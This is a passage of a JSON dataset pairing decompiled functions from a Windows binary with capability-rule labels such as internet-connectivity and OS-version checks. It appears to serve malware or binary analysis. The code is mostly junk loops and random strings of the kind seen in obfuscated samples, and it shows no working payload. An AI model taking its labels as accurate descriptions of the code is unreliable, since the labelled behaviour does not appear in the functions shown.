        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004049cc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_2ch)\n\n{\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_41h;\n    uchar var_32h;\n    uchar var_31h;\n    uint var_30h;\n    uint var_29h;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x519448;\n    var_1ch = 0x78c;\n    stack0xffffffd4 = *0x519450;\n    var_29h._0_1_ = 0;\n    var_30h = 0xcef;\n    var_31h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"trhzodqupurxwjpkwuvqtxpcyvgpz\", &var_41h);\n    fcn.00483140();\n    var_32h = 1;\n    stack0xffffffbc = *0x519458;\n    for (var_ch = 0xd; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 392
    },
    "00404a9a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00404a9a(uint noname_0, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint arg_2ch, uint arg_30h)\n\n{\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x56; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (var_8h = 0x29; 0 < var_8h; var_8h = var_8h + -1) {\n    }\n    return 0xfff5;\n}\n",
        "token_count": 264
    },
    "00404b20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __fastcall fcn.00404b20(uint param_1)\n\n{\n    uint var_1ch;\n    uchar var_12h;\n    uchar var_11h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0xbee;\n    var_11h = 0;\n    for (var_ch = 0x52; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"dlqu\", &var_12h);\n    fcn.00483140();\n    return param_1;\n}\n",
        "token_count": 169
    },
    "00404b9a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 __cdecl fcn.00404b9a(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_bch;\n    uint var_b0h;\n    uint var_98h;\n    uint var_80h;\n    uint var_67h;\n    uint var_49h;\n    uchar var_2dh;\n    uint var_2ch;\n    ulong uStack44;\n    ulong uStack36;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x519468;\n    fcn.00483110();\n    fcn.004b21e0(\"jdzyoiljdlkunxgbtgushwsvqbkcbfoqwzcbawuravsrupvgkytjuebpognuwgaxyfjdjkkjjzopggaumd\", &var_67h);\n    fcn.00483140();\n    uStack36 = *0x519470;\n    fcn.00483110();\n    fcn.004b21e0(\"xdkefojqodlczfqstkthqspqewdzgjddfrvcqechyymf\", &var_67h + 1);\n    fcn.00483140();\n    uStack44 = *0x519478;\n    var_2ch = 0x827;\n    fcn.00483110();\n    fcn.004b21e0(\"pvlzgepilisioohmfwdsmryyzfzfbdsgrdtsvztepzwobswuqntqatrluslpmfrqatwvvlfepqugk\", &var_67h + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"jdzyoiljdlkunxgbtgushwsvqbkcbfoqwzcbawuravsrupvgkytjuebpognuwgaxyfjdjkkjjzopggaumd\", &var_49h);\n    fcn.00483110();\n    fcn.004b21e0(\"jdzyoiljdlkunxgbtgushwsvqbkcbfoqwzcbawuravsrupvgkytjuebpognuwgaxyfjdjkkjjzopggaumd\", &var_2dh);\n    cVar2 = fcn.004c09a0(&var_49h + 1, &var_67h + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x519480;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x46; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 744
    },
    "00404de8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.00404de8(uint noname_0, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_150h;\n    uint var_135h;\n    uint var_119h;\n    uint var_fdh;\n    uint var_e1h;\n    uint var_c5h;\n    uint var_a9h;\n    uint var_8dh;\n    uint var_71h;\n    uint var_55h;\n    uint var_39h;\n    int32_t var_1dh;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"zwjbulpgtbvlaximipocjieaymziwgshsotacilwqcjqhdwgpkulhjuvghcrgwjvnhrknibaifovrd\", &var_135h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"zwjbulpgtbvlaximipocjieaymziwgshsotacilwqcjqhdwgpkulhjuvghcrgwjvnhrknibaifovrd\", &var_119h);\n    fcn.00483110();\n    fcn.004b21e0(\"zwjbulpgtbvlaximipocjieaymziwgshsotacilwqcjqhdwgpkulhjuvghcrgwjvnhrknibaifovrd\", &var_fdh);\n    cVar1 = fcn.004c09a0(&var_119h + 1, &var_135h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x50; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"zwjbulpgtbvlaximipocjieaymziwgshsotacilwqcjqhdwgpkulhjuvghcrgwjvnhrknibaifovrd\", &var_e1h);\n    fcn.00483110();\n    fcn.004b21e0(\"zwjbulpgtbvlaximipocjieaymziwgshsotacilwqcjqhdwgpkulhjuvghcrgwjvnhrknibaifovrd\", &var_c5h);\n    cVar1 = fcn.004c09a0(&var_e1h + 1, &var_fdh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x12; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"zwjbulpgtbvlaximipocjieaymziwgshsotacilwqcjqhdwgpkulhjuvghcrgwjvnhrknibaifovrd\", &var_a9h);\n    fcn.00483110();\n    fcn.004b21e0(\"zwjbulpgtbvlaximipocjieaymziwgshsotacilwqcjqhdwgpkulhjuvghcrgwjvnhrknibaifovrd\", &var_8dh);\n    cVar1 = fcn.004c1070(&var_a9h + 1, &var_c5h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_14h = 0x53; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"zwjbulpgtbvlaximipocjieaymziwgshsotacilwqcjqhdwgpkulhjuvghcrgwjvnhrknibaifovrd\", &var_71h);\n    fcn.00483110();\n    fcn.004b21e0(\"zwjbulpgtbvlaximipocjieaymziwgshsotacilwqcjqhdwgpkulhjuvghcrgwjvnhrknibaifovrd\", &var_55h);\n    cVar1 = fcn.004c1070(&var_71h + 1, &var_8dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_18h = 0x57; 0 < var_18h; var_18h = var_18h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"zwjbulpgtbvlaximipocjieaymziwgshsotacilwqcjqhdwgpkulhjuvghcrgwjvnhrknibaifovrd\", &var_39h);\n    fcn.00483110();\n    fcn.004b21e0(\"zwjbulpgtbvlaximipocjieaymziwgshsotacilwqcjqhdwgpkulhjuvghcrgwjvnhrknibaifovrd\", &var_1dh);\n    cVar1 = fcn.004c1070(&var_39h + 1, &var_55h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffe0 = 0x3d; 0 < stack0xffffffe0; unique0x00007a80 = stack0xffffffe0 + -1) {\n        }\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 1548
    },
    "00405406": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00405406(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint noname_6, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint in_ECX;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar var_32h;\n    uint var_31h;\n    uchar var_21h;\n    uint var_20h;\n    uint var_19h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x772;\n    stack0xffffffe4 = *0x5194b0;\n    var_19h._0_1_ = 1;\n    var_20h = 0x6c6;\n    var_21h = 1;\n    stack0xffffffcc = *0x5194b8;\n    var_31h._0_1_ = 0;\n    for (var_ch = 0x2f; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"yxjadaoeftyhka\", &var_32h);\n    fcn.00483140();\n    return in_ECX;\n}\n",
        "token_count": 379
    },
    "004055d6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.004055d6(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch, uint arg_30h, uint noname_11, uint arg_38h, uint arg_3ch, \n            uint arg_40h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_94h;\n    uint var_79h;\n    uint var_5dh;\n    uchar var_43h;\n    uchar var_42h;\n    uint var_41h;\n    uint var_38h;\n    uint var_34h;\n    ulong uStack52;\n    uint var_28h;\n    uint var_21h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_18h = 0x4f6;\n    stack0xffffffdc = *0x5194d8;\n    var_21h._0_1_ = 0;\n    var_28h = 0x2b1;\n    uStack52 = *0x5194e0;\n    var_34h = 0x83c;\n    var_38h = 0x94;\n    stack0xffffffbc = *0x5194e8;\n    fcn.00483110();\n    fcn.004b21e0(\"uhweqnakwzhxupbkzrpmeaucspkvpbmxmnbkpbkjhpeubiwmkeaxoexiukdgabryrrfevcdohlehmwmeuj\", &var_79h);\n    fcn.00483140();\n    var_41h._0_1_ = 0;\n    for (var_ch = 0x24; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"uhweqnakwzhxupbkzrpmeaucspkvpbmxmnbkpbkjhpeubiwmkeaxoexiukdgabryrrfevcdohlehmwmeuj\", &var_5dh);\n    fcn.00483110();\n    fcn.004b21e0(\"uhweqnakwzhxupbkzrpmeaucspkvpbmxmnbkpbkjhpeubiwmkeaxoexiukdgabryrrfevcdohlehmwmeuj\", &var_43h);\n    cVar1 = fcn.004c09a0(&var_5dh + 1, &var_79h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x1e; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    for (var_14h = 0x18; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"pmhgflmwbdkfjigvj\", &var_42h);\n    fcn.00483140();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 922
    },
    "00405832": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nfloat10 __cdecl\nfcn.00405832(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x59; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return *0x5194f8;\n}\n",
        "token_count": 174
    },
    "0040a2bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a2bc(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if ((arg_8h == 1) && (arg_ch == 0xffff)) {\n        fcn.004b9aa0();\n        fcn.004014c0(fcn.0040a2aa);\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "0040a308": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.0040a308(uint noname_0, uint arg_ch, uint arg_10h, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_51h;\n    uint var_35h;\n    uint var_1ah;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"diwajuvmpharjvkzxqvdbsbtsmjfbsbq\", &var_51h);\n    fcn.00483140();\n    stack0xffffffe4 = *0x521f30;\n    fcn.00483110();\n    fcn.004b21e0(\"diwajuvmpharjvkzxqvdbsbtsmjfbsbq\", &var_35h);\n    fcn.00483110();\n    fcn.004b21e0(\"diwajuvmpharjvkzxqvdbsbtsmjfbsbq\", &var_1ah);\n    cVar1 = fcn.004c1070(&var_35h + 1, &var_51h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x41; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x11; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"oqrvvlgcf\", &var_1ah + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 524
    },
    "0040a4f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 __cdecl\nfcn.0040a4f4(uint noname_0, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint noname_6, \n            uint noname_7, uint arg_28h, uint arg_2ch, uint noname_10, uint arg_34h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_dch;\n    uint var_c4h;\n    uint var_ach;\n    uint var_94h;\n    uint var_7ch;\n    uint var_61h;\n    uchar var_5dh;\n    uchar var_5ch [27];\n    uint var_41h;\n    uchar var_25h;\n    uint var_24h;\n    uchar var_1dh;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"qpnqvesqlkjxkmwzafisuq\", &var_61h);\n    fcn.00483140();\n    uStack28 = *0x521f40;\n    var_1ch = 0x382;\n    fcn.00483110();\n    fcn.004b21e0(\"xofbtzyezir\", &var_61h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"zineqefrpceckkuqidqgmpqtqdhhbrqztonpjabgyoirdlditzrayrlzpzdosksyhaebfdofwetruingpaezmopely\", \n                 &var_61h + 2);\n    fcn.00483140();\n    var_1dh = 1;\n    var_24h = 0x162a;\n    fcn.00483110();\n    fcn.004b21e0(0x5196ef, &var_61h + 3);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"goifzarbvnykaqzofoucbawxvb\", &var_5dh);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"zineqefrpceckkuqidqgmpqtqdhhbrqztonpjabgyoirdlditzrayrlzpzdosksyhaebfdofwetruingpaezmopely\", &var_41h)\n    ;\n    fcn.00483110();\n    fcn.004b21e0(\"zineqefrpceckkuqidqgmpqtqdhhbrqztonpjabgyoirdlditzrayrlzpzdosksyhaebfdofwetruingpaezmopely\", &var_25h)\n    ;\n    cVar2 = fcn.004c09a0(&var_41h + 1, var_5ch);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x521f48;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x19; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 900
    },
    "0040a856": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040a856(void)\n\n{\n    char cVar1;\n    uint var_9ch;\n    uint var_8ch;\n    uint var_74h;\n    uint var_5ah;\n    uint var_3dh;\n    uchar var_22h;\n    uchar var_21h;\n    uint var_20h;\n    uint var_19h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"nvfhhqszroqcavfoqltjyuyaddzxutkpnilamhnnpoqraigqgfyjjcuylfnijaizmtevpbf\", &var_5ah);\n    fcn.00483140();\n    var_10h = 0x17d3;\n    fcn.00483110();\n    fcn.004b21e0(\"eyocrcpcmtalrautgicwjfrxtnymerecpckhiinswelfjvdmalfjkdjjcdmjsmirhvdepkljpqoqpqcio\", &var_5ah + 1);\n    fcn.00483140();\n    stack0xffffffe4 = *0x521f68;\n    var_19h._0_1_ = 1;\n    var_20h = 0x3ee;\n    var_21h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"eyocrcpcmtalrautgicwjfrxtnymerecpckhiinswelfjvdmalfjkdjjcdmjsmirhvdepkljpqoqpqcio\", &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"eyocrcpcmtalrautgicwjfrxtnymerecpckhiinswelfjvdmalfjkdjjcdmjsmirhvdepkljpqoqpqcio\", &var_22h);\n    cVar1 = fcn.004c09a0(&var_3dh + 1, &var_5ah + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x4c; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 606
    },
    "0040aa0e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.0040aa0e(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_bdh;\n    uint var_a1h;\n    uint var_85h;\n    uint var_69h;\n    uint var_4dh;\n    uint var_31h;\n    int32_t var_16h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"lcbctqbiassuuayzzxpkknp\", &var_bdh);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"lcbctqbiassuuayzzxpkknp\", &var_a1h);\n    fcn.00483110();\n    fcn.004b21e0(\"lcbctqbiassuuayzzxpkknp\", &var_85h);\n    cVar1 = fcn.004c09a0(&var_a1h + 1, &var_bdh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x24; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"lcbctqbiassuuayzzxpkknp\", &var_69h);\n    fcn.00483110();\n    fcn.004b21e0(\"lcbctqbiassuuayzzxpkknp\", &var_4dh);\n    cVar1 = fcn.004c09a0(&var_69h + 1, &var_85h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x3c; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"lcbctqbiassuuayzzxpkknp\", &var_31h);\n    fcn.00483110();\n    fcn.004b21e0(\"lcbctqbiassuuayzzxpkknp\", &var_16h);\n    cVar1 = fcn.004c1070(&var_31h + 1, &var_4dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffe8 = 0x20; 0 < stack0xffffffe8; unique0x00007a80 = stack0xffffffe8 + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"pbhqidqcftzxm\", &var_16h + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 871
    },
    "0040ad98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0040ad98(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint noname_10, uint arg_34h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e0h;\n    uint var_c8h;\n    uint var_b0h;\n    uint var_98h;\n    uint var_80h;\n    uint var_65h;\n    uchar var_61h;\n    uchar var_60h [27];\n    uint var_45h;\n    uchar var_2ah;\n    uchar var_29h;\n    uint var_28h;\n    uint var_21h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"zgbnvwbhmtmaubflcsoialignonseyjbnbnxvutxoojutprhwbjqtwikhdvypaqabeofxapacxqkemomthvocljeu\", &var_65h);\n    fcn.00483140();\n    var_14h = 0xe6c;\n    stack0xffffffdc = *0x521f70;\n    fcn.00483110();\n    fcn.004b21e0(\"lvqhihnpwulqrvaofhbiepgxeiqthgycsnlejplkzziokjgzrmufqkjutrzbxacucohxbvhfmrxiuqdegqpby\", &var_65h + 1);\n    fcn.00483140();\n    var_21h._0_1_ = 0;\n    var_28h = 0x5d4;\n    fcn.00483110();\n    fcn.004b21e0(\"imzatnlplaexbpyowmgowph\", &var_65h + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"luwgnfwlasxewkvjpnvpokan\", &var_65h + 3);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"vgrnzubvdibbkufrclqiadhuknajqacvhjvbgpjiqik\", &var_61h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"imzatnlplaexbpyowmgowph\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"imzatnlplaexbpyowmgowph\", &var_2ah);\n    cVar1 = fcn.004c1070(&var_45h + 1, var_60h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x27; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x1f; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x5198e0, &var_29h);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 996
    },
    "0040b10c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
